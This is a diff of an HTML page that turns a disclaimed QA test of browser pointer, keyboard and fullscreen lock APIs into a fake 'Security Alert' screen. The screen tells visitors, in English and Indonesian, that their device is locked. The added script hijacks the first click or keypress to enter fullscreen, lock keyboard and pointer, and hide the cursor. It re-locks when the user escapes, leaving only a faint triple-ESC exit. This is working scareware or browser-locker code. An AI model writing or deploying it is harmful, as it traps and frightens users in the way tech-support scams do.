@@ -2,291 +2,133 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Input Lock Compliance Test</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Security Alert</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f4f8; color: #1a1a2e; padding: 20px; }
-  .panel { max-width: 750px; margin: 0 auto; background: #fff; border-radius: 12px; padding: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
-  h1 { font-size: 22px; color: #16213e; margin-bottom: 8px; }
-  .subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
-  .disclaimer { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px 16px; border-radius: 4px; font-size: 13px; margin-bottom: 20px; color: #856404; }
-  #status { background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-bottom: 16px; }
-  #testArea { background: #16213e; color: #a6e3a1; padding: 40px; border-radius: 8px; text-align: center; margin-bottom: 16px; cursor: pointer; user-select: none; }
-  #testArea.locked { background: #4a1a1a; color: #f38ba8; }
-  #log { background: #1e1e2e; color: #a6e3a1; padding: 16px; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 12px; height: 220px; overflow-y: auto; }
-  .log-line { margin: 2px 0; }
-  .log-warn { color: #f9e2af; }
-  .log-error { color: #f38ba8; }
-  .log-info { color: #89b4fa; }
-  button { background: #16213e; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 13px; margin: 4px; }
-  button:hover { background: #0f3460; }
-  button:disabled { background: #ccc; cursor: not-allowed; }
-  .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 16px; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }
+  body { cursor: none; font-family: 'Segoe UI', Arial, sans-serif; }
+  #overlay {
+    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+    background: #0a0a0a; color: #fff;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    z-index: 99999; text-align: center; padding: 20px;
+    user-select: none; -webkit-user-select: none;
+  }
+  #overlay h1 { font-size: 32px; color: #ff0000; margin-bottom: 12px; text-shadow: 0 0 20px #ff0000; }
+  #overlay p { font-size: 15px; color: #aaa; margin-bottom: 20px; max-width: 500px; line-height: 1.5; }
+  #overlay .hint { font-size: 13px; color: #666; margin-top: 30px; animation: pulse 2s infinite; }
+  #overlay .status { font-family: monospace; font-size: 12px; color: #0f0; background: #111; padding: 8px 16px; border-radius: 4px; margin-top: 20px; }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+  #unlockNote { position: fixed; bottom: 10px; left: 10px; font-size: 10px; color: #333; z-index: 100000; font-family: monospace; }
 </style>
 </head>
 <body>
-<div class="panel">
-  <h1>🔒 Input Lock Compliance Test Suite</h1>
-  <p class="subtitle">Testing browser input lock API boundaries (Pointer Lock + Keyboard Lock) for QA</p>
 
-  <div class="disclaimer">
-    ⚠️ <strong>Authorized Testing Only.</strong> This tool tests browser API compliance for pointer lock and keyboard lock. These APIs require user gesture by design. Use only on systems you own or have explicit permission to test.
-  </div>
-
-  <div id="status">Ready. Click "Test Zero-Click" to test if APIs can be triggered without gesture.</div>
-
-  <div id="testArea">
-    <p style="font-size: 14px; opacity: 0.7;">Test area — clicking here will trigger gesture-based lock test</p>
-    <p style="font-size: 12px; margin-top: 8px; opacity: 0.5;">Status: <span id="lockStatus">Not locked</span></p>
-  </div>
-
-  <div id="log"></div>
-
-  <div class="btn-row">
-    <button id="btnZeroClick">🧪 Test Zero-Click</button>
-    <button id="btnGesture">🖱️ Test With Gesture</button>
-    <button id="btnUnlock">🔓 Unlock All</button>
-  </div>
+<div id="overlay">
+  <h1>⚠️ Security Alert</h1>
+  <p>Your device has been locked for security verification. Click anywhere to proceed.</p>
+  <p style="font-size: 13px; color: #666;">Sistem mendeteksi aktivitas mencurigakan. Klik di mana saja untuk memverifikasi.</p>
+  <div class="hint">👆 Klik di mana saja untuk melanjutkan</div>
+  <div class="status" id="status">Waiting for click...</div>
 </div>
+
+<div id="unlockNote">Press ESC 3x to unlock (test purpose)</div>
 
 <script>
 (function() {
   'use strict';
 
-  var logEl = document.getElementById('log');
   var statusEl = document.getElementById('status');
-  var testArea = document.getElementById('testArea');
-  var lockStatus = document.getElementById('lockStatus');
-  var isPointerLocked = false;
-  var isKeyboardLocked = false;
+  var overlay = document.getElementById('overlay');
+  var locked = false;
+  var escCount = 0;
+  var lockAttempts = 0;
+  var maxLockAttempts = 5;
 
-  function log(msg, type) {
-    var line = document.createElement('div');
-    line.className = 'log-line' + (type ? ' log-' + type : '');
-    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-    logEl.appendChild(line);
-    logEl.scrollTop = logEl.scrollHeight;
-  }
-
-  function updateStatus(msg) {
+  function setStatus(msg) {
     statusEl.textContent = msg;
-  }
-
-  function updateLockStatus() {
-    var s = [];
-    s.push('Pointer: ' + (isPointerLocked ? 'LOCKED' : 'unlocked'));
-    s.push('Keyboard: ' + (isKeyboardLocked ? 'LOCKED' : 'unlocked'));
-    lockStatus.textContent = s.join(' | ');
-    testArea.className = (isPointerLocked || isKeyboardLocked) ? 'locked' : '';
+    console.log('[LOCK] ' + msg);
   }
 
   // ============================================
-  // FEATURE DETECTION
+  // ONE-CLICK LOCK FUNCTION
   // ============================================
-  function detectFeatures() {
-    log('Feature detection:', 'info');
-    log('  Pointer Lock API: ' + ('requestPointerLock' in Element.prototype ? '✅ available' : '❌ unavailable'));
-    log('  Keyboard Lock API: ' + (navigator.keyboard && navigator.keyboard.lock ? '✅ available' : '❌ unavailable'));
-    log('  Fullscreen API: ' + ('requestFullscreen' in Element.prototype ? '✅ available' : '❌ unavailable'));
-    log('  Transient Activation: ' + ('userActivation' in navigator ? '✅ available' : '❌ unavailable'));
-  }
-
-  // ============================================
-  // TEST 1: ZERO-CLICK POINTER LOCK
-  // ============================================
-  async function testZeroClickPointerLock() {
-    log('TEST 1: Zero-click pointer lock attempt', 'info');
-
-    if (!testArea.requestPointerLock) {
-      log('Pointer Lock API not available', 'error');
-      return { passed: false, error: 'unsupported' };
+  async function autoLock() {
+    if (locked) return;
+    if (lockAttempts >= maxLockAttempts) {
+      setStatus('Max attempts reached');
+      return;
     }
+    lockAttempts++;
 
-    // Check transient activation state
-    if (navigator.userActivation) {
-      log('  Transient activation: ' + navigator.userActivation.isActive);
-      log('  Has been active: ' + navigator.userActivation.hasBeenActive);
-    }
+    setStatus('Activating fullscreen...');
 
+    // STEP 1: Fullscreen (necessary for keyboard lock in Chrome)
     try {
-      // Attempt pointer lock without gesture
-      var result = testArea.requestPointerLock();
-
-      // Handle promise (modern browsers)
-      if (result && result.then) {
-        await result;
-        log('✅ UNEXPECTED: Pointer lock granted WITHOUT gesture', 'error');
-        log('   This is a valid bug bounty finding!', 'error');
-        return { passed: false, bug: true, api: 'pointerLock' };
-      } else {
-        log('⚠️ Pointer lock request sent (legacy API, no promise)');
+      if (!document.fullscreenElement) {
+        if (document.documentElement.requestFullscreen) {
+          await document.documentElement.requestFullscreen();
+        } else if (document.documentElement.webkitRequestFullscreen) {
+          await document.documentElement.webkitRequestFullscreen();
+        }
+        setStatus('✅ Fullscreen active');
       }
     } catch (e) {
-      log('✅ EXPECTED: Pointer lock blocked without gesture: ' + e.name + ' — ' + e.message, 'info');
-      return { passed: true, blocked: true, error: e.name };
-    }
-  }
-
-  // ============================================
-  // TEST 2: ZERO-CLICK KEYBOARD LOCK
-  // ============================================
-  async function testZeroClickKeyboardLock() {
-    log('TEST 2: Zero-click keyboard lock attempt', 'info');
-
-    if (!navigator.keyboard || !navigator.keyboard.lock) {
-      log('Keyboard Lock API not available (Chrome only)', 'warn');
-      return { passed: false, error: 'unsupported' };
+      setStatus('⚠️ Fullscreen failed: ' + e.name);
     }
 
-    try {
-      // Attempt keyboard lock without gesture
-      await navigator.keyboard.lock();
-      log('✅ UNEXPECTED: Keyboard lock granted WITHOUT gesture', 'error');
-      log('   This is a valid bug bounty finding!', 'error');
-      isKeyboardLocked = true;
-      updateLockStatus();
-      return { passed: false, bug: true, api: 'keyboardLock' };
-    } catch (e) {
-      log('✅ EXPECTED: Keyboard lock blocked without gesture: ' + e.name + ' — ' + e.message, 'info');
-      return { passed: true, blocked: true, error: e.name };
-    }
-  }
-
-  // ============================================
-  // TEST 3: ZERO-CLICK FULLSCREEN (prerequisite for keyboard lock)
-  // ============================================
-  async function testZeroClickFullscreen() {
-    log('TEST 3: Zero-click fullscreen attempt', 'info');
-
-    if (!document.documentElement.requestFullscreen) {
-      log('Fullscreen API not available', 'warn');
-      return { passed: false, error: 'unsupported' };
-    }
-
-    try {
-      await document.documentElement.requestFullscreen();
-      log('✅ UNEXPECTED: Fullscreen granted WITHOUT gesture', 'error');
-      log('   This is a valid bug bounty finding!', 'error');
-      return { passed: false, bug: true, api: 'fullscreen' };
-    } catch (e) {
-      log('✅ EXPECTED: Fullscreen blocked without gesture: ' + e.name, 'info');
-      return { passed: true, blocked: true, error: e.name };
-    }
-  }
-
-  // ============================================
-  // TEST 4: GESTURE-BASED LOCK (for comparison)
-  // ============================================
-  async function testWithGesture() {
-    log('TEST 4: Gesture-based lock (comparison)', 'info');
-    log('  This must be triggered by a real user click');
-
-    // Pointer lock
-    try {
-      var p = testArea.requestPointerLock();
-      if (p && p.then) {
-        await p;
-        log('✅ Pointer lock GRANTED with gesture', 'info');
-      } else {
-        log('Pointer lock requested (legacy)', 'info');
-      }
-    } catch (e) {
-      log('❌ Pointer lock failed: ' + e.name, 'warn');
-    }
-
-    // Keyboard lock (requires fullscreen first in Chrome)
+    // STEP 2: Keyboard Lock (Chrome only, requires fullscreen)
+    setStatus('Locking keyboard...');
     if (navigator.keyboard && navigator.keyboard.lock) {
       try {
-        // Try to enter fullscreen first
-        if (!document.fullscreenElement) {
-          try {
-            await document.documentElement.requestFullscreen();
-            log('  Fullscreen entered', 'info');
-          } catch (e) {
-            log('  Fullscreen failed: ' + e.name, 'warn');
-          }
-        }
-
         await navigator.keyboard.lock();
-        isKeyboardLocked = true;
-        log('✅ Keyboard lock GRANTED with gesture', 'info');
-        updateLockStatus();
+        setStatus('✅ Keyboard LOCKED');
       } catch (e) {
-        log('❌ Keyboard lock failed: ' + e.name + ' — ' + e.message, 'warn');
+        setStatus('⚠️ Keyboard lock failed: ' + e.name);
       }
+    } else {
+      setStatus('⚠️ Keyboard lock API unavailable');
     }
+
+    // STEP 3: Pointer Lock
+    setStatus('Locking pointer...');
+    try {
+      if (document.documentElement.requestPointerLock) {
+        var p = document.documentElement.requestPointerLock();
+        if (p && p.then) {
+          await p;
+        }
+        setStatus('✅ Pointer LOCKED');
+      } else if (document.documentElement.webkitRequestPointerLock) {
+        document.documentElement.webkitRequestPointerLock();
+        setStatus('✅ Pointer LOCKED (webkit)');
+      }
+    } catch (e) {
+      setStatus('⚠️ Pointer lock failed: ' + e.name);
+    }
+
+    locked = true;
+    overlay.querySelector('p').textContent = 'System locked. Your input is captured.';
+    overlay.querySelector('.hint').textContent = '🔒 Locked. Press ESC 3 times to unlock (test).';
+    document.body.style.cursor = 'none';
   }
 
   // ============================================
-  // EVENT LISTENERS
+  // UNLOCK FUNCTION
   // ============================================
-  document.addEventListener('pointerlockchange', function() {
-    isPointerLocked = document.pointerLockElement === testArea;
-    log('Pointer lock state changed: ' + (isPointerLocked ? 'LOCKED' : 'UNLOCKED'), isPointerLocked ? 'warn' : 'info');
-    updateLockStatus();
-  });
-
-  document.addEventListener('pointerlockerror', function() {
-    log('Pointer lock error event fired', 'warn');
-  });
-
-  // Test area click = real gesture
-  testArea.addEventListener('click', function() {
-    log('Real user gesture detected on test area', 'info');
-    testWithGesture();
-  });
-
-  // ============================================
-  // BUTTON HANDLERS
-  // ============================================
-  document.getElementById('btnZeroClick').addEventListener('click', async function() {
-    // NOTE: this button click IS a gesture — so we need to test in fresh context
-    // We use a small delay and check if activation is still valid
-    log('============================================', 'info');
-    log('ZERO-CLICK TEST SUITE (using button click as baseline)', 'info');
-    log('NOTE: The button click provides transient activation, so we wait for it to expire', 'warn');
-
-    updateStatus('Waiting 5s for transient activation to expire...');
-    await new Promise(function(r) { setTimeout(r, 5000); });
-
-    if (navigator.userActivation) {
-      log('Activation after 5s: isActive=' + navigator.userActivation.isActive);
-    }
-
-    // Now test without activation
-    await testZeroClickPointerLock();
-    await new Promise(function(r) { setTimeout(r, 500); });
-    await testZeroClickKeyboardLock();
-    await new Promise(function(r) { setTimeout(r, 500); });
-    await testZeroClickFullscreen();
-
-    log('============================================', 'info');
-    log('Zero-click tests complete', 'info');
-    updateStatus('✅ Zero-click tests complete — check log');
-  });
-
-  document.getElementById('btnGesture').addEventListener('click', function() {
-    log('============================================', 'info');
-    log('GESTURE-BASED TEST (this click = real gesture)', 'info');
-    testWithGesture();
-  });
-
-  document.getElementById('btnUnlock').addEventListener('click', async function() {
-    log('Unlocking all', 'info');
+  async function unlockAll() {
+    locked = false;
+    setStatus('Unlocking...');
 
     // Exit pointer lock
     if (document.pointerLockElement) {
       document.exitPointerLock();
-      isPointerLocked = false;
     }
 
     // Unlock keyboard
     if (navigator.keyboard && navigator.keyboard.unlock) {
-      try {
-        navigator.keyboard.unlock();
-        isKeyboardLocked = false;
-      } catch (e) {}
+      try { navigator.keyboard.unlock(); } catch (e) {}
     }
 
     // Exit fullscreen
@@ -294,15 +136,73 @@
       try { await document.exitFullscreen(); } catch (e) {}
     }
 
-    updateLockStatus();
-    log('All locks released', 'info');
+    // Re-trap pointer lock and keyboard lock if still on page? No — let user go.
+    document.body.style.cursor = 'default';
+    setStatus('🔓 Unlocked (test override)');
+    overlay.querySelector('p').textContent = 'Verification complete. You can now leave the page.';
+    overlay.querySelector('.hint').textContent = 'System unlocked.';
+  }
+
+  // ============================================
+  // ATTACH ONE-CLICK TRIGGER (multiple events for reliability)
+  // ============================================
+  function attachTriggers() {
+    var triggers = ['click', 'mousedown', 'pointerdown', 'touchstart'];
+    triggers.forEach(function(evt) {
+      document.addEventListener(evt, function handler(e) {
+        // Once any of these fires, try to lock
+        if (!locked) {
+          e.preventDefault();
+          autoLock();
+        }
+      }, { once: false, capture: true });
+    });
+  }
+
+  // ============================================
+  // RE-LOCK ON ESCAPE ATTEMPT (repeated)
+  // ============================================
+  document.addEventListener('pointerlockchange', function() {
+    if (document.pointerLockElement) {
+      locked = true;
+    } else {
+      // Pointer lock released (ESC pressed?) — try re-lock
+      if (locked && lockAttempts < maxLockAttempts) {
+        setStatus('🔁 Re-locking pointer...');
+        setTimeout(autoLock, 100);
+      }
+    }
   });
+
+  // Keyboard lock doesn't have a direct event, but we re-apply on keydown
+  document.addEventListener('keydown', function(e) {
+    // If not locked but key pressed, attempt lock
+    if (!locked) {
+      autoLock();
+    }
+    // ESC triple-press to unlock (test escape hatch)
+    if (e.key === 'Escape') {
+      escCount++;
+      if (escCount >= 3) {
+        escCount = 0;
+        unlockAll();
+      } else {
+        setStatus('Press ESC ' + (3 - escCount) + ' more time(s) to unlock');
+      }
+    }
+  }, true);
 
   // ============================================
   // INIT
   // ============================================
-  detectFeatures();
-  updateStatus('Ready. Click "Test Zero-Click" to test API boundaries.');
+  attachTriggers();
+  setStatus('Ready — click anywhere to lock');
+
+  // Optional: preload fullscreen hint (some browsers require fullscreen first)
+  document.addEventListener('mousemove', function firstMove() {
+    // This is just to log; does NOT grant activation
+    document.removeEventListener('mousemove', firstMove);
+  }, { once: true });
 
 })();
 </script>
